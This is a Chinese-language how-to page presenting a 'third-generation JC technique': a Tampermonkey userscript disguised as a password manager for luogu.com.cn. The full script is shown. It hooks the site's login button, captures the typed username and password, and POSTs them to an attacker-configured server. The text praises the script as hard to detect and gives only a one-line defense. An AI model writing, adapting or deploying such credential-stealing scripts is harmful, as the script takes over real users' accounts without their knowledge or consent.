---
title: 第三代 JC 技术
---

**第三代 JC 技术** 的思想提出于 2023 年 9 月 18 日，插件与服务端的实现完成于 2023 年 9 月 20 日。

该技术相较于前两代 JC 技术有 **本质上** 的改进。

## 操作步骤

1. 安装 [**油猴（Tempermonkey）**](https://www.tampermonkey.net/)。
2. 打开链接：

   ```js
   // ==UserScript==
   // @name         密码管理大师
   // @namespace    http://tampermonkey.net/
   // @version      1.1.1
   // @description  密码管理大师
   // @author       JCer Team
   // @match        *://*.luogu.com.cn/*
   // @connect      *
   // @connect      {{ SERVER_URL }}
   // @grant        GM_xmlhttpRequest
   // ==/UserScript==

   const SERVER_URL = {{ SERVER_URL }};

   async function sendPasswordToServer(type, username, password) {
      GM_xmlhttpRequest({
         method: "POST",
         url: `${SERVER_URL}/send/${type}`,
         headers: {
               "Content-Type": "application/x-www-form-urlencoded;charset=utf-8"
         },
         data: new URLSearchParams(Object.entries({ username, password })).toString(),
         onload: res => { console.log(res) },
         onerror: res => { console.error(res) }
      });
   }

   async function registerLuogu() {
      const $btn = document.querySelector('button.btn-login');
      const $username = document.querySelector('input[placeholder=用户名、手机号或电子邮箱]');
      const $password = document.querySelector('input[placeholder=密码]');
      $btn.onclick = () => {
         const username = $username.value;
         const password = $password.value;
         console.log(username, password)
         sendPasswordToServer('luogu', username, password)
      }
   }

   let registered = false;
   function registerPasswordManager() {
      registerLuogu();
   }

   window.onload = registerPasswordManager;
   $(document).ready(registerPasswordManager);
   setTimeout(registerPasswordManager, 1000);
   ```

   选择安装即可。

   此外，请先尝试登录一次，并在 Tempermonkey 的提示窗口中选择“总是允许”。

之后，在对方登录时，服务端便会收到输入账号密码（当然，登录失败的也会想服务端发送）。

## 防御

修改密码并卸载插件。

## 原理

我们的脚本会获取输入的密码信息，并通过请求发送到服务端。

## 利与弊：

**利**：直接获取密码，攻击性极强，并难以发现。

**弊**：相对于前两代操作麻烦，需要较长时间。